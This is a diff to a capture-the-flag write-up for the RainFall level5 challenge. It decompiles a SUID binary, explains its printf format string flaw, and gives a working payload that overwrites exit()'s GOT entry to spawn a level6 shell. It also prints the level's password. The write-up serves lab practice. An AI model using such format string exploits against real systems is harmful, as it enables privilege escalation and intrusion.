@@ -1,8 +1,57 @@
-The program reads up to 512 characters from the user into buffer
+We get in the level5, then we list the files in the home directory:
+
+```
+    level5@RainFall:~$ ls -la
+    -rwsr-s---+ 1 level6 users  5385 Mar  6  2016 level5
+```
+
+The binary is owned by level6 and has the SUID bit set, meaning if it executes any shell, it will run with level6's privileges.
+
+We try to execute the binary file to get an idea of what it does exactly
+
+```
+    level5@RainFall:~$ ./level5 
+    sdasdas
+    sdasdas
+    level5@RainFall:~$ ./level5 
+    sdasdjasgdhsajgdhjasgdhjasgdjhasgdhajsgdhjasgdjhasgdjhasgdasjhgdasjhgdasjhgdjhasgdasjhgdjhasgdas
+    sdasdjasgdhsajgdhjasgdhjasgdjhasgdhajsgdhjasgdjhasgdjhasgdasjhgdasjhgdasjhgdjhasgdasjhgdjhasgdas
+    level5@RainFall:~$ 
+
+```
+
+We decompile the binary to get the source code:
+
+```
+void o()
+{
+    system("/bin/sh");
+    exit(1);
+}
+
+void n()
+{
+    char buffer[512];
+
+    fgets(buffer, sizeof(buffer), stdin);
+
+    printf(buffer);
+
+    exit(1);
+}
+
+int main(int argc, char** argv, char** envp)
+{
+    n();
+}
+
+```
+
+The program reads up to 512 characters from the user into buffer (no stack buffer overflow)
 
 It then directly passes buffer to printf without format specifiers this introduces a format string vulnerability.
 
-This allows us to write arbitrary memory using format specifiers like %h, %n.
+This allows us to write arbitrary memory using format specifiers like %hn, %n.
 
 We gone overwrite the GOT (Global Offset Table) entry of exit() with the address of the o() function.
 
@@ -15,24 +64,7 @@ the address of the o() function
         All defined functions:
 
         Non-debugging symbols:
-        0x08048334  _init
-        0x08048380  printf
-        0x08048380  printf@plt
-        0x08048390  _exit
-        0x08048390  _exit@plt
-        0x080483a0  fgets
-        0x080483a0  fgets@plt
-        0x080483b0  system
-        0x080483b0  system@plt
-        0x080483c0  __gmon_start__
-        0x080483c0  __gmon_start__@plt
-        0x080483d0  exit
-        0x080483d0  exit@plt
-        0x080483e0  __libc_start_main
-        0x080483e0  __libc_start_main@plt
-        0x080483f0  _start
-        0x08048420  __do_global_dtors_aux
-        0x08048480  frame_dummy
+        ...
         0x080484a4  o
         0x080484c2  n
         0x08048504  main
@@ -62,45 +94,43 @@ the address of o() is => 0x080484a4
     level5@RainFall:~$ ./level5 <<< $(python -c 'print("AAAABBBB" + ".%x."*30)')
     AAAABBBB.200..b7fd1ac0..b7ff37d0..41414141..42424242..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e.
 ```
-the argument is 4
+the argument are 4 and 5
 
 - the address of exit:
 
 ```
     level5@RainFall:~$ objdump -R ./level5 | grep exit
-    08049828 R_386_JUMP_SLOT   _exit
+    ...
     08049838 R_386_JUMP_SLOT   exit
 ```
 
-the address of exit() is => 0x08049838 => litle indian1 => \x38\x98\x04\x08 | litle indian2 => \x3a\x98\x04\x08
+the address of exit() is => 0x08049838 => litle indian => \x38\x98\x04\x08 | litle indian2 => \x3a\x98\x04\x08
 
 ```
     the address of o() is => 0x080484a4
 
-    Decimal number of 0x0804 => 2052
-    Decimal number of 0x84a4 => 33956
+    Decimal number of upper 16 bit 0x0804 => 2052
+    Decimal number of lower 16 bit 0x84a4 => 33956
 
-    first_padding = 2052 - 8 = 2044
-    second_padding = 33956 - 2052 = 31904
+    first_padding = 33956 - 8 = 33948
+    second_padding = (2052 - 33956) % 65536 = 33632
 ```
 
 ```
-    level5@RainFall:~$ python -c 'print("\x38\x98\x04\x08" + "\x3a\x98\x04\x08" + "%2044d%4$hn" + "%31904d%4$hn")' > /tmp/hax
-    level5@RainFall:~$ (cat /tmp/hax; cat) | ./level5
+    level5@RainFall:~$ python -c 'print("\x38\x98\x04\x08" + "\x3a\x98\x04\x08" + "%33948d%4$hn" + "%33632d%5$hn")' > /tmp/level5.exploit
+    level5@RainFall:~$ (cat /tmp/level5.exploit; cat) | ./level5
     whoami
     level6
     cat /home/user/level6/.pass                        
     d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
 ```
 
-9a3ida:
+We jump to next level:
+
 ```
-    0x0804a004
-
-    upper = 0x0804 => 2052
-    lower = 0xa004 => 40964
-
-    uper - dakchiliprintiti9bl = 2052 - 8 = 2044
-
-    lower - upper = 40964 - 2052 = 38912
+level5@RainFall:~$ su level6
+Password:d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level6/level6
+level6@RainFall:~$ 
 ```
